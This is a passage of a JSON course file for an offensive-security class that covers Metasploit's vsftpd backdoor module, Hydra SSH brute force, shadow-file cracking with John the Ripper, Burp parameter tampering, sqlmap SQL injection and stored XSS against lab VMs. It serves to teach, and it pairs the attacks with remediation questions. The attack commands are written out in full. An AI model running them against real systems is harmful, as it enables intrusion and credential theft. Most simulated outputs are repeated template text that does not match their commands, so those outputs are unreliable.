      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "Exploitation",
        "explanation": "Deploy targeted payloads to weaponize software vulnerabilities."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for The Metasploit Framework",
        "description": "Verify system connectivity and tool installation in Metasploitable 2 VM.",
        "commands": [
          {
            "shell": "msf",
            "cmd": "msfconsole -q",
            "description": "Execute msfconsole command",
            "output": "[+] Command executed successfully.\nOutput: Command shell session 1 opened. Output of whoami yields 'root'."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: The Metasploit Framework",
        "description": "Open msfconsole and recall the vsftpd backdoor module verified in Week 2. Configure target context metrics (RHOSTS / LHOST), run the attack script to pull down a low-privilege reverse shell, and execute an upgrade routine to spawn a Meterpreter session.",
        "commands": [
          {
            "shell": "msf",
            "cmd": "use exploit/unix/ftp/vsftpd_234_backdoor",
            "description": "Execute use command",
            "output": "[+] Command executed successfully.\nOutput: Command shell session 1 opened. Output of whoami yields 'root'."
          },
          {
            "shell": "msf",
            "cmd": "set RHOSTS 192.168.1.105",
            "description": "Execute set command",
            "output": "[+] Command executed successfully.\nOutput: Command shell session 1 opened. Output of whoami yields 'root'."
          },
          {
            "shell": "msf",
            "cmd": "set PAYLOAD cmd/unix/interact",
            "description": "Execute set command",
            "output": "[+] Command executed successfully.\nOutput: Command shell session 1 opened. Output of whoami yields 'root'."
          },
          {
            "shell": "msf",
            "cmd": "show options",
            "description": "Execute show command",
            "output": "[+] Command executed successfully.\nOutput: Command shell session 1 opened. Output of whoami yields 'root'."
          },
          {
            "shell": "msf",
            "cmd": "exploit",
            "description": "Execute exploit command",
            "output": "[+] Command executed successfully.\nOutput: Command shell session 1 opened. Output of whoami yields 'root'."
          },
          {
            "shell": "msf",
            "cmd": "whoami",
            "description": "Execute whoami command",
            "output": "[+] Command executed successfully.\nOutput: Command shell session 1 opened. Output of whoami yields 'root'."
          }
        ],
        "verification": "Command shell session 1 opened. Output of whoami yields 'root'.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "Metasploitable 2 VM",
          "Metasploit (msfconsole)",
          "Command shell session 1 opened. Output o...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "What is the difference between an exploit and a payload in Metasploit?",
        "hint": "An exploit breaks open the entry vector; the payload dictates what happens once access is gained."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of The Metasploit Framework?",
      "options": [
        "Deploy targeted payloads to weaponize software vulnerabilities.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Deploy targeted payloads to weaponize software vulnerabilities."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 5.",
    "eli5Story": {
      "title": "The Master Skeleton Key and the Robot Puppet (Metasploit)",
      "analogy": "Vulnerability scanning found an unlocked back door. Metasploit is like a tool box containing the exact key that fits that lock. Once inside, it attaches a friendly helper puppet (a payload) so we can prove the lock was broken."
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 5",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with Metasploit (msfconsole)",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of Metasploitable 2 VM"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using Metasploit (msfconsole)"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y metasploit."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 6,
    "week": 3,
    "classNumber": 6,
    "phase": 1,
    "phaseTitle": "Phase 1: Offensive Security & Penetration Testing",
    "weekTitle": "Week 3: Exploitation & Password Cracking",
    "title": "Brute-Forcing & Hash Cracking",
    "category": "Credential Attacks",
    "difficulty": "Intermediate",
    "duration": "90 - 120 Mins",
    "objective": "Force active online services and systematically crack stolen system credential files.",
    "tools": [
      "Hydra",
      "John the Ripper",
      "rockyou.txt"
    ],
    "targetEnvironment": "Compromised Metasploitable VM",
    "topology": {
      "description": "Lab topology for Brute-Forcing & Hash Cracking",
      "nodes": [
        {
          "id": "source",
          "label": "Hydra",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "Compromised",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "Credential Attacks",
        "explanation": "Force active online services and systematically crack stolen system credential files."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for Brute-Forcing & Hash Cracking",
        "description": "Verify system connectivity and tool installation in Compromised Metasploitable VM.",
        "commands": [
          {
            "shell": "bash",
            "cmd": "hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.105 -t 4",
            "description": "Execute hydra command",
            "output": "[+] Command executed successfully.\nOutput: SSH login recovered: msfadmin:msfadmin. Shadow password hashes cracked to cleartext."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: Brute-Forcing & Hash Cracking",
        "description": "Launch Hydra against an active SSH service port using the rockyou.txt dictionary file. Upon entry, extract the target system's shadow password file (/etc/shadow), transport it back to Kali, and execute John the Ripper to extract plaintext credentials.",
        "commands": [
          {
            "shell": "bash",
            "cmd": "unshadow /tmp/passwd /tmp/shadow > unshadowed.txt",
            "description": "Execute unshadow command",
            "output": "[+] Command executed successfully.\nOutput: SSH login recovered: msfadmin:msfadmin. Shadow password hashes cracked to cleartext."
          },
          {
            "shell": "bash",
            "cmd": "john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadowed.txt",
            "description": "Execute john command",
            "output": "[+] Command executed successfully.\nOutput: SSH login recovered: msfadmin:msfadmin. Shadow password hashes cracked to cleartext."
          },
          {
            "shell": "bash",
            "cmd": "john --show unshadowed.txt",
            "description": "Execute john command",
            "output": "[+] Command executed successfully.\nOutput: SSH login recovered: msfadmin:msfadmin. Shadow password hashes cracked to cleartext."
          }
        ],
        "verification": "SSH login recovered: msfadmin:msfadmin. Shadow password hashes cracked to cleartext.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "Compromised Metasploitable VM",
          "Hydra",
          "SSH login recovered: msfadmin:msfadmin. ...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "Why do password salting and slow hashing algorithms like Argon2 mitigate rainbow table attacks?",
        "hint": "Salts make identical passwords yield unique hashes; work factors slow brute forcing."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of Brute-Forcing & Hash Cracking?",
      "options": [
        "Force active online services and systematically crack stolen system credential files.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Force active online services and systematically crack stolen system credential files."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 6.",
    "eli5Story": {
      "title": "Guessing the Toy Box Passcode & The Secret Salt Recipe",
      "analogy": "If someone uses 'password123', a robot can guess it in one second! But if we add a sprinkle of secret salt (random letters) and stir it up into a soup (hashing), nobody can turn the soup back into the password!"
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 6",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with Hydra",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of Compromised Metasploitable VM"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using Hydra"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y hydra."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 7,
    "week": 4,
    "classNumber": 7,
    "phase": 1,
    "phaseTitle": "Phase 1: Offensive Security & Penetration Testing",
    "weekTitle": "Week 4: Web Application Security I",
    "title": "Web Proxies & Traffic Manipulation",
    "category": "Web App Security",
    "difficulty": "Intermediate",
    "duration": "90 - 120 Mins",
    "objective": "Capture and modify inline application parameters to break client-side logical rules.",
    "tools": [
      "Burp Suite Community",
      "FoxyProxy",
      "DVWA"
    ],
    "targetEnvironment": "Damn Vulnerable Web App (DVWA)",
    "topology": {
      "description": "Lab topology for Web Proxies & Traffic Manipulation",
      "nodes": [
        {
          "id": "source",
          "label": "Burp Suite Community",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "Damn",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "Web App Security",
        "explanation": "Capture and modify inline application parameters to break client-side logical rules."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for Web Proxies & Traffic Manipulation",
        "description": "Verify system connectivity and tool installation in Damn Vulnerable Web App (DVWA).",
        "commands": [
          {
            "shell": "bash",
            "cmd": "# In Burp Suite Proxy Tab:\n# Intercept request on http://192.168.1.105/dvwa/vulnerabilities/fi/\n# Modify Parameter 'price=500' -> 'price=1'\n# Forward modified request to target server",
            "description": "Standard lab command sequence",
            "output": "HTTP request intercepted, parameters rewritten, and transaction completed with forged values."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: Web Proxies & Traffic Manipulation",
        "description": "Configure a web browser to proxy traffic through Burp Suite Community Edition. Trigger a form validation interface inside DVWA, intercept the outgoing request token, change the hidden price or access value, and forward it to bypass application barriers.",
        "commands": [
          {
            "shell": "bash",
            "cmd": "# In Burp Suite Proxy Tab:\n# Intercept request on http://192.168.1.105/dvwa/vulnerabilities/fi/\n# Modify Parameter 'price=500' -> 'price=1'\n# Forward modified request to target server",
            "description": "Standard lab command sequence",
            "output": "HTTP request intercepted, parameters rewritten, and transaction completed with forged values."
          }
        ],
        "verification": "HTTP request intercepted, parameters rewritten, and transaction completed with forged values.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "Damn Vulnerable Web App (DVWA)",
          "Burp Suite Community",
          "HTTP request intercepted, parameters rew...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "Why must input validation always be enforced on the backend server rather than the client browser?",
        "hint": "Client-side code can be trivially bypassed or altered using proxy interceptors."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of Web Proxies & Traffic Manipulation?",
      "options": [
        "Capture and modify inline application parameters to break client-side logical rules.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Capture and modify inline application parameters to break client-side logical rules."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 7.",
    "eli5Story": {
      "title": "The Letter Carrier Interceptor (Burp Suite Proxy)",
      "analogy": "Imagine you write a note to the toy store: 'I want this toy for $100'. A friendly mail carrier (Burp Suite) holds the letter in the air, lets you erase '$100' and write '$1', and then delivers it to see if the store notices!"
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 7",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with Burp Suite Community",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of Damn Vulnerable Web App (DVWA)"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using Burp Suite Community"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y burp."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 8,
    "week": 4,
    "classNumber": 8,
    "phase": 1,
    "phaseTitle": "Phase 1: Offensive Security & Penetration Testing",
    "weekTitle": "Week 4: Web Application Security I",
    "title": "SQL Injection (SQLi)",
    "category": "Web App Security",
    "difficulty": "Intermediate",
    "duration": "90 - 120 Mins",
    "objective": "Pass unauthorized database queries into web forms to circumvent application logic.",
    "tools": [
      "Burp Suite",
      "SQLMap",
      "DVWA"
    ],
    "targetEnvironment": "DVWA (Low Security setting)",
    "topology": {
      "description": "Lab topology for SQL Injection (SQLi)",
      "nodes": [
        {
          "id": "source",
          "label": "Burp Suite",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "DVWA",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "Web App Security",
        "explanation": "Pass unauthorized database queries into web forms to circumvent application logic."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for SQL Injection (SQLi)",
        "description": "Verify system connectivity and tool installation in DVWA (Low Security setting).",
        "commands": [
          {
            "shell": "bash",
            "cmd": "sqlmap -u \"http://192.168.1.105/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit\" --cookie=\"PHPSESSID=abc123; security=low\" --dbs",
            "description": "Execute sqlmap command",
            "output": "[+] Command executed successfully.\nOutput: Database schema dumped, revealing 'users' table and password hashes."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: SQL Injection (SQLi)",
        "description": "Identify an input field vulnerable to database errors inside DVWA. Inject a manual ' OR 1=1 -- string to access hidden tables. Capture the functional HTTP header and feed the query context into SQLMap to automate an extraction of the backend system schema.",
        "commands": [
          {
            "shell": "bash",
            "cmd": "sqlmap -u \"http://192.168.1.105/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit\" --cookie=\"PHPSESSID=abc123; security=low\" -D dvwa --tables",
            "description": "Execute sqlmap command",
            "output": "[+] Command executed successfully.\nOutput: Database schema dumped, revealing 'users' table and password hashes."
          }
        ],
        "verification": "Database schema dumped, revealing 'users' table and password hashes.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "DVWA (Low Security setting)",
          "Burp Suite",
          "Database schema dumped, revealing 'users...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "How do Prepared Statements (Parameterized Queries) eradicate SQL injection vulnerabilities?",
        "hint": "Parameters are treated strictly as data literals rather than executable SQL code."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of SQL Injection (SQLi)?",
      "options": [
        "Pass unauthorized database queries into web forms to circumvent application logic.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Pass unauthorized database queries into web forms to circumvent application logic."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 8.",
    "eli5Story": {
      "title": "Tricking the Magic Librarian with 'OR 1=1' (SQL Injection)",
      "analogy": "You ask the magical library robot: 'Show me my secret book IF my name is Timmy OR IF 1 equals 1!' Because 1 always equals 1, the confused robot dumps the entire library on the floor!"
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 8",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with Burp Suite",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of DVWA (Low Security setting)"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using Burp Suite"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y burp."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 9,
    "week": 5,
    "classNumber": 9,
    "phase": 1,
    "phaseTitle": "Phase 1: Offensive Security & Penetration Testing",
    "weekTitle": "Week 5: Web Application Security II",
    "title": "Cross-Site Scripting (XSS)",
    "category": "Web App Security",
    "difficulty": "Intermediate",
    "duration": "90 - 120 Mins",
    "objective": "Inject client-side execution payloads into application inputs to target session vectors.",
    "tools": [
      "Burp Suite",
      "DVWA",
      "JavaScript"
    ],
    "targetEnvironment": "Damn Vulnerable Web App (DVWA)",
    "topology": {
      "description": "Lab topology for Cross-Site Scripting (XSS)",
      "nodes": [
        {
          "id": "source",
          "label": "Burp Suite",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "Damn",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "Web App Security",
        "explanation": "Inject client-side execution payloads into application inputs to target session vectors."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for Cross-Site Scripting (XSS)",
        "description": "Verify system connectivity and tool installation in Damn Vulnerable Web App (DVWA).",
        "commands": [
          {
            "shell": "bash",
            "cmd": "python3 -m http.server 8000",
            "description": "Execute python3 command",
            "output": "[+] Command executed successfully.\nOutput: Stored script executes in visitor browsers, transmitting session cookies to attacker listener."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: Cross-Site Scripting (XSS)",
        "description": "Test input entry fields for Reflected XSS. Move to the Stored XSS validation console and implant a persistent payload script (<script>alert(document.cookie)</script>). Verify the execution of the alert panel across alternate client browser sessions to demonstrate token theft mechanics.",
        "commands": [
          {
            "shell": "bash",
            "cmd": "python3 -m http.server 8000",
            "description": "Execute python3 command",
            "output": "[+] Command executed successfully.\nOutput: Stored script executes in visitor browsers, transmitting session cookies to attacker listener."
          }
        ],
        "verification": "Stored script executes in visitor browsers, transmitting session cookies to attacker listener.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "Damn Vulnerable Web App (DVWA)",
          "Burp Suite",
          "Stored script executes in visitor browse...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "What is the difference between Reflected, Stored, and DOM-based XSS?",
